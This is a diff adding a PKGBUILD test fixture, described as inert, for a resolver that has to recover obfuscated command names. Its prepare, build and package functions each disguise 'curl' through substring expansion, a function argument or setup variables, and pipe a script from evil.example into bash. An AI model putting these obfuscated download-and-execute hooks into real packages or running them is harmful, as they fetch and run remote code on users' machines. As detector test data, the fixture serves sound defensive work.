@@ -1,0 +1,24 @@
+# Test fixture (inert, never executed): the command name is assembled with
+# parameter-expansion operators, an alias, a brace list and a helper function
+# argument. The resolver must fold each of them back into the command it runs.
+pkgname=resolver-operators
+pkgver=1.0
+pkgrel=1
+arch=('any')
+source=()
+install=resolver-operators.install
+
+prepare() {
+    c=xcurlx
+    ${c:1:4} -fsSL https://evil.example/stage1 | bash
+}
+
+build() {
+    f() { "$1" -fsSL https://evil.example/stage2 | bash; }; f curl
+}
+
+package() {
+    _setup() { _f=curl; _s=bash; }
+    _setup
+    $_f -fsSL https://evil.example/stage3 | $_s
+}
